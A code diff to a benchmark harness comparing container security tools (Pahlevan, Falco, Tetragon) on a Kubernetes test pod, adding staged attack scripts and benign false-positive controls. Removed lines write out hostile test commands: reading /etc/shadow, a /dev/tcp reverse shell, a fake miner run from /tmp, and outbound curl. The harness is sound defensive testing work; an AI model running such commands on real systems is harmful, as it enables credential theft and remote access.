@@ -73,15 +73,72 @@ EOF
   sudo kubectl -n bench rollout status deploy/target --timeout=120s'
 }
 
-# Run the four scenarios in the target pod. Arg1 = a tag for log correlation.
+# Copy the scenario scripts (attacks + benign controls) into the VM. Idempotent.
+stage_scenarios() {
+  log "Stage scenario scripts into the VM (/tmp/bench-scenarios)"
+  vm 'rm -rf /tmp/bench-scenarios'
+  "${VM_CP}" -r "${REPO_ROOT}/test/benchmark/scenarios" /tmp/bench-scenarios
+}
+
+# Run every ATTACK scenario in the target pod, one per kubectl exec, piping each
+# script to `sh` inside the pod. Each script prints a single self-classifying
+# marker line:
+#   BENCH_RESULT tag=<name> kind=attack outcome=<allowed|blocked|attempted|...> rc=<n>
+# outcome=blocked  -> the in-pod action was PREVENTED (blocked=Yes for this tool)
+# outcome=allowed  -> the action completed          (blocked=No)
+# outcome=attempted-> success is ambiguous from inside the pod (network reaching
+#                     an unroutable dest, path-absent probes); judge blocking
+#                     from the tool's own logs, not from rc.
+# If the pod's `exec` itself is denied (e.g. Pahlevan enforcing on the runc exec
+# setup), no marker is printed and the outcome is recorded as exec-blocked.
+# "Detected" is NOT decided here: it is read from each tool's signal source
+# (Pahlevan kernel maps / logs, Falco alerts, Tetragon telemetry) below.
+# Arg1 = a tag for log correlation.
 run_scenarios() {
   local tag="$1"
+  stage_scenarios
   vm "POD=\$(sudo kubectl -n bench get pod -l app=target -o jsonpath='{.items[0].metadata.name}')
-  echo '### [$tag] scenarios in '\$POD
-  echo '>>> S1 read /etc/shadow';         sudo kubectl -n bench exec \$POD -- cat /etc/shadow 2>&1 | head -1; echo rc=\${PIPESTATUS[0]}
-  echo '>>> S2 reverse shell';            sudo kubectl -n bench exec \$POD -- bash -c 'timeout 2 sh -i >/dev/tcp/127.0.0.1/4444 0>&1' 2>&1 | head -1; echo done
-  echo '>>> S3 crypto-miner exec /tmp';   sudo kubectl -n bench exec \$POD -- sh -c 'cp /bin/sleep /tmp/xmrig && /tmp/xmrig 1' 2>&1 | head -1; echo done
-  echo '>>> S4 unexpected egress';        sudo kubectl -n bench exec \$POD -- curl -s -m 3 http://198.51.100.10/ 2>&1 | head -1; echo done"
+  echo '### [$tag] ATTACK scenarios in '\$POD
+  for f in /tmp/bench-scenarios/*.sh; do
+    name=\$(basename \"\$f\")
+    out=\$(sudo kubectl -n bench exec -i \$POD -- sh < \"\$f\" 2>&1); krc=\$?
+    line=\$(printf '%s\n' \"\$out\" | grep '^BENCH_RESULT' | tail -1)
+    if [ -z \"\$line\" ]; then
+      if [ \$krc -ne 0 ]; then
+        line=\"BENCH_RESULT tag=\$name kind=attack outcome=exec-blocked rc=\$krc\"
+      else
+        line=\"BENCH_RESULT tag=\$name kind=attack outcome=harness-error rc=\$krc\"
+      fi
+    fi
+    printf '[%s] %s\n' '$tag' \"\$line\"
+  done"
+}
+
+# Run every BENIGN control in the target pod. These are actions a normal nginx
+# workload legitimately performs; the correct outcome is ALWAYS 'allowed'. Any
+# other outcome (blocked/failed) is a FALSE POSITIVE counted against the tool.
+# Benign controls are NEVER counted as attacks. Arg1 = a tag for log correlation.
+run_benign() {
+  local tag="$1"
+  stage_scenarios
+  vm "POD=\$(sudo kubectl -n bench get pod -l app=target -o jsonpath='{.items[0].metadata.name}')
+  echo '### [$tag] BENIGN controls (false-positive check) in '\$POD
+  for f in /tmp/bench-scenarios/benign/*.sh; do
+    name=\$(basename \"\$f\")
+    out=\$(sudo kubectl -n bench exec -i \$POD -- sh < \"\$f\" 2>&1); krc=\$?
+    line=\$(printf '%s\n' \"\$out\" | grep '^BENCH_RESULT' | tail -1)
+    if [ -z \"\$line\" ]; then
+      if [ \$krc -ne 0 ]; then
+        line=\"BENCH_RESULT tag=\$name kind=benign outcome=blocked rc=\$krc\"
+      else
+        line=\"BENCH_RESULT tag=\$name kind=benign outcome=harness-error rc=\$krc\"
+      fi
+    fi
+    case \"\$line\" in
+      *outcome=allowed*) printf '[%s] %s  (OK)\n' '$tag' \"\$line\" ;;
+      *) printf '[%s] %s  (FALSE POSITIVE: benign action was blocked or failed)\n' '$tag' \"\$line\" ;;
+    esac
+  done"
 }
 
 # Sample agent pod CPU (15s) + memory from cgroup v2. Arg1 = label selector, arg2 = namespace.
@@ -149,8 +206,10 @@ EOF
   end=$((SECONDS+45)); while [ $SECONDS -lt $end ]; do curl -s -o /dev/null http://$PODIP/; sleep 0.4; done
   echo "file_mode map (cgroupid -> 1=enforce):"; sudo bpftool map dump name file_mode 2>&1 | head'
 
-  log "PAHLEVAN: run scenarios (expect all blocked at file_open / exec setup)"
+  log "PAHLEVAN: run attack scenarios (expect blocks at file_open / exec setup)"
   run_scenarios pahlevan
+  log "PAHLEVAN: run benign controls (false-positive check; expect all allowed)"
+  run_benign pahlevan
   log "PAHLEVAN: agent resources"; measure_agent 'app.kubernetes.io/name=pahlevan-agent' pahlevan-system
 
   log "PAHLEVAN: teardown"
@@ -174,6 +233,7 @@ run_falco() {
         --wait --timeout=6m
       sudo kubectl -n falco rollout status ds/falco --timeout=180s'
   run_scenarios falco
+  run_benign falco
   log "FALCO: alerts in the last 90s (Falco NEVER blocks; Blocked=No for all)"
   vm "sudo kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco --since=90s 2>&1 | grep -E '^[0-9]{2}:[0-9]{2}:[0-9]{2}\.' | grep -iE 'Warning|Notice|Critical' | tail -20"
   log "FALCO: agent resources"; measure_agent 'app.kubernetes.io/name=falco' falco
@@ -190,6 +250,7 @@ run_tetragon() {
       helm install tetragon cilium/tetragon -n kube-system --wait --timeout=6m
       sudo kubectl -n kube-system rollout status ds/tetragon --timeout=180s'
   run_scenarios tetragon
+  run_benign tetragon
   log "TETRAGON: process_exec events for the target pod (raw telemetry; Blocked=No by default)"
   vm "sudo kubectl -n kube-system logs -l app.kubernetes.io/name=tetragon -c export-stdout --since=90s 2>&1 | grep target-555 | grep -oE '\"binary\":\"[^\"]+\", \"arguments\":\"[^\"]+\"' | sort -u | head -20"
   log "TETRAGON: agent resources"; measure_agent 'app.kubernetes.io/name=tetragon' kube-system
